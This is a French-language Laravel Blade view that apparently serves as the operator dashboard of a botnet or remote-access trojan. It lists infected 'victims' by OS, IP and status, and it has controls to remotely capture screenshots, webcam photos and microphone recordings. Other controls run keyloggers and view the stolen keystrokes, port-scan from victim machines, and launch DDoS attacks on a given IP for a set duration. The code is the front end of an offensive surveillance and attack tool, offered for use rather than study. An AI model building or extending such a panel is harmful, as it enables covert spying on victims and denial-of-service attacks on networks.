@extends("layouts.layout")

@section("title", "Accueil")

@section("content")
<section class="section">
    <div class="card mb-3">
        <div class="row g-0">
            <div class="col-md-4">
                <img src="{{ asset('images/' . $group->image) }}" class="img-fluid rounded-start" alt="{{ $group->name }}">
            </div>
            <div class="col-md-8">
                <div class="card-body">
                    <h1 class="card-title">{{ strtoupper($group->name) }}</h1>
                    <!-- Bordered Tabs Justified -->
                    <ul class="nav nav-tabs nav-tabs-bordered d-flex" id="borderedTabJustified" role="tablist">
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100 active" id="home-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-home" type="button" role="tab" aria-controls="home" aria-selected="true">Victimes</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="profile-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-profile" type="button" role="tab" aria-controls="profile" aria-selected="false">DDOS</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="record-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-record" type="button" role="tab" aria-controls="record" aria-selected="false">Enregistrements</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="picture-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-picture" type="button" role="tab" aria-controls="picture" aria-selected="false">Photos</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="screen-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-screen" type="button" role="tab" aria-controls="screen" aria-selected="false">Captures</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="scan-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-scan" type="button" role="tab" aria-controls="scan" aria-selected="false">Scan</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="keylogger-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-keylogger" type="button" role="tab" aria-controls="keylogger" aria-selected="false">Keylogger</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="contact-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-contact" type="button" role="tab" aria-controls="contact" aria-selected="false">Informations</button>
                        </li>
                    </ul>
                    @if(session('output'))
                        <div class="alert alert-info">{{ session('output') }}</div>
                    @endif
                    <div class="tab-content pt-2" id="borderedTabJustifiedContent">
                        <div class="tab-pane fade show active" id="bordered-justified-home" role="tabpanel" aria-labelledby="home-tab">
                            <table class="table">
                                <tbody>
                                    @foreach ($victims as $victim)
                                    <tr>
                                        <th scope="row">
                                            @if ($victim->os == "windows")
                                            <i class="bx bxl-windows"></i>
                                            @elseif ($victim->os == "linux")
                                            <i class="bx bxl-tux"></i>
                                            @elseif ($victim->os == "macos")
                                            <i class="bx bxl-apple"></i>
                                            @endif
                                        </th>
                                        <td>
                                            @if ($victim->status == "1")
                                            <div class="spinner-grow spinner-grow-sm text-success" role="status">
                                                <span class="visually-hidden">Loading...</span>
                                            </div>
                                            @else
                                            <div class="spinner-grow spinner-grow-sm text-danger" role="status">
                                                <span class="visually-hidden">Loading...</span>
                                            </div>
                                            @endif
                                        </td>
                                        <td>{{ $victim->ip }}</td>
                                        <td>{{ $victim->uid }}</td>
                                        <form method="POST" action="{{ route('network.scan') }}">
                                            @csrf
                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                            <input type="hidden" name="group_id" value="{{ $group->id }}">
                                            <td><button type="submit" class="btn btn-warning"><i class="bi bi-broadcast"></i></button></td>
                                        </form>
                                        <form method="POST" action="{{ route('network.screenshot') }}">
                                            @csrf
                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                            <input type="hidden" name="group_id" value="{{ $group->id }}">
                                            <td><button type="submit" class="btn btn-warning"><i class="bi bi-fullscreen"></i></button></td>
                                        </form>
                                        <form method="POST" action="{{ route('network.picture') }}">
                                            @csrf
                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                            <input type="hidden" name="group_id" value="{{ $group->id }}">
                                            <td><button type="submit" class="btn btn-warning"><i class="bi bi-camera-fill"></i></button></td>
                                        </form>
                                        <form method="POST" action="{{ route('network.record') }}">
                                            @csrf
                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                            <input type="hidden" name="group_id" value="{{ $group->id }}">
                                            <td><button type="submit" class="btn btn-warning"><i class="bi bi-mic-fill"></i></button></td>
                                        </form>
                                        <td><a class="btn btn-primary">Connexion</a></td>
                                    </tr>
                                    @endforeach
                                </tbody>
                            </table>
                        </div>
                        <div class="tab-pane fade" id="bordered-justified-profile" role="tabpanel" aria-labelledby="profile-tab">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">DDOS</h5>
                                    <form method="POST" action="{{ route('network.ddos') }}">
                                        @csrf  <!-- N'oubliez pas le jeton CSRF pour la sécurité -->
                                        <div class="row mb-3">
                                            <label class="col-sm-2 col-form-label">ID Groupe</label>
                                            <div class="col-sm-10">
                                                <input type="text" class="form-control" name="group_id" value="{{ $group->id }}" readonly>
                                            </div>
                                        </div>
                                        <div class="row mb-3">
                                            <label class="col-sm-2 col-form-label">Nom groupe</label>
                                            <div class="col-sm-10">
                                                <input type="text" class="form-control" name="group_name" value="{{ $group->name }}" readonly>
                                            </div>
                                        </div>
                                        <div class="mb-3 row">
                                            <label class="col-sm-2 col-form-label">Adresse IP</label>
                                            <div class="col-sm-10">
                                                <input type="text" class="form-control" name="ip_address">
                                            </div>
                                        </div>
                                        <div class="mb-3 row">
                                            <label class="col-sm-2 col-form-label">Temps (en secondes)</label>
                                            <div class="col-sm-10">
                                                <input type="number" class="form-control" name="duration">
                                            </div>
                                        </div>
                                        <button type="submit" class="btn btn-success">Démarrer le DDOS</button>
                                    </form>
                                    <div class="credits">
                                        <br>
                                        Vous êtes responsable des conséquences que cet outil peut avoir sur les victimes.
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="tab-pane fade" id="bordered-justified-record" role="tabpanel" aria-labelledby="record-tab">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">Enregistrements</h5>
                                                @if ($victims->isEmpty())
                                                    <div class="alert alert-warning" role="alert">
                                                        Aucune victime n'est enregistrée.
                                                    </div>
                                                @else
                                                <div class="card">
                                                    <div class="card-body">
                                                    <!-- Accordion without outline borders -->
                                                        <div class="accordion accordion-flush" id="accordionFlushExample">
                                                            @foreach ($victims as $index => $victim)
                                                                <div class="accordion-item">
                                                                    <h2 class="accordion-header" id="flush-heading{{ $index }}">
                                                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapse{{ $index }}" aria-expanded="false" aria-controls="flush-collapse{{ $index }}">
                                                                            {{ $victim->uid }}
                                                                        </button>
                                                                    </h2>
                                                                    <div id="flush-collapse{{ $index }}" class="accordion-collapse collapse" aria-labelledby="flush-heading{{ $index }}" data-bs-parent="#accordionFlushExample">
                                                                        @php
                                                                        $victimRecords = $records->filter(function($record) use ($victim) {
                                                                            return $record->victim_id == $victim->id;
                                                                        });
                                                                        @endphp
                                                                        @if ($victimRecords->isEmpty())
                                                                            <div class="alert alert-warning" role="alert">
                                                                                Aucun enregistrement.
                                                                            </div>
                                                                        @else
                                                                            <table class="table">
                                                                                <thead>
                                                                                    <tr>
                                                                                        <th scope="col">Id</th>
                                                                                        <th scope="col">Nom</th>
                                                                                        <th scope="col">Heure</th>
                                                                                        <th scope="col">Date</th>
                                                                                        <th scope="col">Actions</th>
                                                                                    </tr>
                                                                                </thead>
                                                                                <tbody>
                                                                                    @foreach ($victimRecords as $record)
                                                                                        <tr>
                                                                                            <th scope="row">{{ $record->id }}</th>
                                                                                            <td>{{ $record->result }}</td>
                                                                                            <td>{{ $record->created_at->format('H:i') }}</td>
                                                                                            <td>{{ $record->created_at->format('d/m/Y') }}</td>
                                                                                            <td>
                                                                                                <button type="submit" class="btn btn-success">Télécharger</button>
                                                                                                <button type="submit" class="btn btn-danger">Supprimer</button>
                                                                                            </td>
                                                                                        </tr>
                                                                                    @endforeach
                                                                                </tbody>
                                                                                </table>
                                                                        @endif
                                                            </div>
                                                        </div>
                                                    @endforeach
                                                </div><!-- End Accordion without outline borders -->
                                            </div>
                                        </div>
                                    @endif
                                </div>
                            </div>
                        </div>

                        <div class="tab-pane fade" id="bordered-justified-picture" role="tabpanel" aria-labelledby="picture-tab">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">Photos</h5>
                                    @if ($pictures->isEmpty())
                                        <div class="alert alert-warning" role="alert">
                                            Aucune photo enregistrée.
                                        </div>
                                    @else
                                        <div class="card">
                                            <div class="card-body">
                                                <!-- Accordion without outline borders for photos -->
                                                <div class="accordion accordion-flush" id="accordionFlushPhotos">
                                                    @foreach ($victims as $index => $victim)
                                                        <div class="accordion-item">
                                                            <h2 class="accordion-header" id="flush-heading{{ $index }}-photos">
                                                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapse{{ $index }}-photos" aria-expanded="false" aria-controls="flush-collapse{{ $index }}-photos">
                                                                    {{ $victim->uid }}
                                                                </button>
                                                            </h2>
                                                            <div id="flush-collapse{{ $index }}-photos" class="accordion-collapse collapse" aria-labelledby="flush-heading{{ $index }}-photos" data-bs-parent="#accordionFlushPhotos">
                                                                @php
                                                                $victimPictures = $pictures->filter(function($picture) use ($victim) {
                                                                    return $picture->victim_id == $victim->id;
                                                                });
                                                                @endphp
                                                                @if ($victimPictures->isEmpty())
                                                                    <div class="alert alert-warning" role="alert">
                                                                        Aucune photo disponible.
                                                                    </div>
                                                                @else
                                                                    <table class="table">
                                                                        <thead>
                                                                            <tr>
                                                                                <th scope="col">Id</th>
                                                                                <th scope="col">Nom</th>
                                                                                <th scope="col">Heure</th>
                                                                                <th scope="col">Date</th>
                                                                                <th scope="col">Actions</th>
                                                                            </tr>
                                                                        </thead>
                                                                        <tbody>
                                                                            @foreach ($victimPictures as $picture)
                                                                                <tr>
                                                                                    <th scope="row">{{ $picture->id }}</th>
                                                                                    <td>{{ $picture->result }}</td>
                                                                                    <td>{{ $picture->created_at->format('H:i') }}</td>
                                                                                    <td>{{ $picture->created_at->format('d/m/Y') }}</td>
                                                                                    <td>
                                                                                        <button type="button" class="btn btn-success">Télécharger</button>
                                                                                        <button type="button" class="btn btn-danger">Supprimer</button>
                                                                                    </td>
                                                                                </tr>
                                                                            @endforeach
                                                                        </tbody>
                                                                    </table>
                                                                @endif
                                                            </div>
                                                        </div>
                                                    @endforeach
                                                </div><!-- End Accordion without outline borders -->
                                            </div>
                                        </div>
                                    @endif
                                </div>
                            </div>
                        </div>

                        <div class="tab-pane fade" id="bordered-justified-screen" role="tabpanel" aria-labelledby="screen-tab">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">Captures</h5>
                                    @if ($screenshots->isEmpty())
                                        <div class="alert alert-warning" role="alert">
                                            Aucune capture d'écran enregistrée.
                                        </div>
                                    @else
                                        <div class="card">
                                            <div class="card-body">
                                                <!-- Accordion without outline borders for screenshots -->
                                                <div class="accordion accordion-flush" id="accordionFlushScreens">
                                                    @foreach ($victims as $index => $victim)
                                                        <div class="accordion-item">
                                                            <h2 class="accordion-header" id="flush-heading{{ $index }}-screen">
                                                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapse{{ $index }}-screen" aria-expanded="false" aria-controls="flush-collapse{{ $index }}-screen">
                                                                    {{ $victim->uid }}
                                                                </button>
                                                            </h2>
                                                            <div id="flush-collapse{{ $index }}-screen" class="accordion-collapse collapse" aria-labelledby="flush-heading{{ $index }}-screen" data-bs-parent="#accordionFlushScreens">
                                                                @php
                                                                $victimScreenshots = $screenshots->filter(function($screenshot) use ($victim) {
                                                                    return $screenshot->victim_id == $victim->id;
                                                                });
                                                                @endphp
                                                                @if ($victimScreenshots->isEmpty())
                                                                    <div class="alert alert-warning" role="alert">
                                                                        Aucune capture disponible.
                                                                    </div>
                                                                @else
                                                                    <table class="table">
                                                                        <thead>
                                                                            <tr>
                                                                                <th scope="col">Id</th>
                                                                                <th scope="col">Nom</th>
                                                                                <th scope="col">Heure</th>
                                                                                <th scope="col">Date</th>
                                                                                <th scope="col">Actions</th>
                                                                            </tr>
                                                                        </thead>
                                                                        <tbody>
                                                                            @foreach ($victimScreenshots as $screenshot)
                                                                                <tr>
                                                                                    <th scope="row">{{ $screenshot->id }}</th>
                                                                                    <td>{{ $screenshot->result }}</td>
                                                                                    <td>{{ $screenshot->created_at->format('H:i') }}</td>
                                                                                    <td>{{ $screenshot->created_at->format('d/m/Y') }}</td>
                                                                                    <td>
                                                                                        <button type="button" class="btn btn-success">Télécharger</button>
                                                                                        <button type="button" class="btn btn-danger">Supprimer</button>
                                                                                    </td>
                                                                                </tr>
                                                                            @endforeach
                                                                        </tbody>
                                                                    </table>
                                                                @endif
                                                            </div>
                                                        </div>
                                                    @endforeach
                                                </div><!-- End Accordion without outline borders -->
                                            </div>
                                        </div>
                                    @endif
                                </div>
                            </div>
                        </div>

                        <div class="tab-pane fade" id="bordered-justified-scan" role="tabpanel" aria-labelledby="scan-tab">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">Scan</h5>
                                    <form method="POST" action="{{ route('network.scanport') }}" class="row g-3">
                                        @csrf
                                        <input type="hidden" name="group_id" value="{{ $group->id }}">
                                        <div class="col-md-3">
                                            <select class="form-select" name="victim_uid" id="validationDefault04" required>
                                                @foreach ($victims as $victim)
                                                <option value="{{ $victim->uid }}">{{ $victim->uid }}</option>
                                                @endforeach
                                            </select>
                                        </div>
                                        <div class="col-md-2">
                                            <input type="text" class="form-control" placeholder="ip" name="ip">
                                        </div>
                                        <div class="col-md-2">
                                            <input type="number" class="form-control" name="port1" required min="1" max="65535" placeholder="port 1">
                                        </div>
                                        <div class="col-md-2">
                                            <input type="number" class="form-control" name="port2" min="1" max="65535" placeholder="port 2">
                                        </div>
                                        <div class="col-md-1">
                                            <button type="submit" class="btn btn-warning"><i class="bi bi-broadcast"></i></button>
                                        </div>
                                    </form>
                                    <!-- Display scan results if available -->
                                    @if ($scan && !empty($scan->result))
                                    <div class="mt-3">
                                        <h6 class="card-subtitle mb-2 text-muted">Résultat du dernier scan:</h6>
                                        <ul class="list-group">
                                            @foreach (explode(' / ', $scan->result) as $item)
                                            <li class="list-group-item">{{ $item }}</li>
                                            @endforeach
                                        </ul>
                                    </div>
                                    @else
                                    <p class="mt-3">Aucun résultat de scan trouvé pour ce groupe.</p>
                                    @endif
                                </div>
                            </div>
                        </div>

                        <div class="tab-pane fade" id="bordered-justified-keylogger" role="tabpanel" aria-labelledby="keylogger-tab">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">Keylogger</h5>
                                    <form method="POST" action="{{ route('network.keylogger') }}" class="row g-3">
                                        @csrf
                                            <input type="hidden" name="group_id" value="{{ $group->id }}">
                                            <div class="col-md-3">
                                                <select class="form-select" name="victim_uid" id="validationDefault04" required>
                                                    @foreach ($victims as $victim)
                                                        <option value="{{ $victim->uid }}">{{ $victim->uid }}</option>
                                                    @endforeach
                                                </select>
                                            </div>
                                            <div class="col-md-2">
                                                <input type="number" class="form-control" placeholder="time" name="time" min="10" required>
                                            </div>
                                            <div class="col-md-1">
                                                <button type="submit" class="btn btn-warning"><i class="bi bi-keyboard"></i></button>
                                            </div>
                                    </form>
                                    <div class="tab-content pt-2" id="borderedTabJustifiedContent">
                                        <div class="tab-pane fade show active" id="bordered-justified-home" role="tabpanel" aria-labelledby="home-tab">
                                            @if ($keyloggers->isNotEmpty())
                                                <ul class="list-group">
                                                    @foreach ($keyloggers as $keylogger)
                                                        <li class="list-group-item">
                                                            Date: {{ $keylogger->created_at->format('Y-m-d H:i:s') }} <br>
                                                            Résultat: {{ $keylogger->result }}
                                                        </li>
                                                    @endforeach
                                                </ul>
                                            @else
                                                <p>Aucun résultat de keylogger trouvé pour ce groupe.</p>
                                            @endif
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="tab-pane fade" id="bordered-justified-contact" role="tabpanel" aria-labelledby="contact-tab">
                            <p>Créé le {{ $group->created_at }}</p>
                            <p><small class="text-muted">Dernière mise à jour le {{ $group->updated_at }}</small></p>
                            <form action="{{ route('network.destroy', $group->id) }}" method="POST">
                                @csrf
                                <button class="btn btn-danger" type="submit">Supprimer</button>
                            </form>
                        </div>
                    </div><!-- End Bordered Tabs Justified -->
                </div>
            </div>
        </div>
    </div>
</section>
@endsection
